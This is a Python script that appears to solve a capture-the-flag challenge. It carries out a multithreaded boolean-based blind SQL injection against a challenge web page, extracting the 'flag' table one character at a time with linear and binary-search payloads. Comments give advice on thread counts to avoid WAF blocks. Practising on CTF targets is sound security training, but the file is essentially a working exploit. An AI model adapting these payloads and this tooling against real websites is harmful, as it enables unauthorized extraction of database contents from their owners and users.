#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2026/8/31 16:14
# @Author  : tushanfirm
# @File    : demo1.py
# @Software: PyCharm
import threading
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  # 抑制 verify=False 警告

url = 'http://37e7c3788438322d822ea7ca.http-ctf2.dasctf.com/index.php'
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
MAX_POSITIONS = 50        # 最多爆破位数
MAX_WORKERS = 8           # 并发线程数，CTF 靶场建议 5~10，太高会触发 WAF/封 IP
TIMEOUT = 10

# 每个线程用一个独立 Session（线程安全 + 复用 TCP 连接，比裸 requests.request 快很多）
thread_local = threading.local()

def get_session():
    if not hasattr(thread_local, "s"):
        s = requests.Session()
        s.proxies.update(proxies)
        s.verify = False
        thread_local.s = s
    return thread_local.s

def guess_position(i):
    """判断第 i 位字符，返回 (i, 字符 或 None)"""
    s = get_session()
    for j in range(32, 127):          # 注意 range(32,127) 本身就不含 127，原脚本 i=i+1 / j=j+1 是无效代码
        payload = "if(ascii(substr((select(flag)from(flag)),{},1))={},1,2)".format(i, j)
        try:
            r = s.post(url, data={'id': payload}, timeout=TIMEOUT)
            if 'Hello' in r.text:
                return i, chr(j)
        except requests.RequestException:
            continue                   # 单次网络异常跳过，避免整个线程挂掉
    return i, None  # 该位 32~126 全部不匹配 → 已到 flag 末尾

def guess_position_binary(i):
    s = get_session()
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        payload = "if(ascii(substr((select(flag)from(flag)),{},1))>{},1,2)".format(i, mid)
        r = s.post(url, data={'id': payload}, timeout=TIMEOUT)
        if 'Hello' in r.text:
            lo = mid + 1
        else:
            hi = mid
    return i, chr(lo) if 32 <= lo <= 126 else None


def main():
    results = {}
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {executor.submit(guess_position, i): i for i in range(1, MAX_POSITIONS + 1)}
        for future in as_completed(futures):
            i, ch = future.result()
            results[i] = ch
            print(f"[+] 位置 {i}: {ch}")

    # 按位置顺序拼接，遇到 None（末尾）就截断
    flag = ''
    for i in sorted(results):
        if results[i] is None:
            break
        flag += results[i]
    print("\nflag: " + flag)

if __name__ == '__main__':
    main()

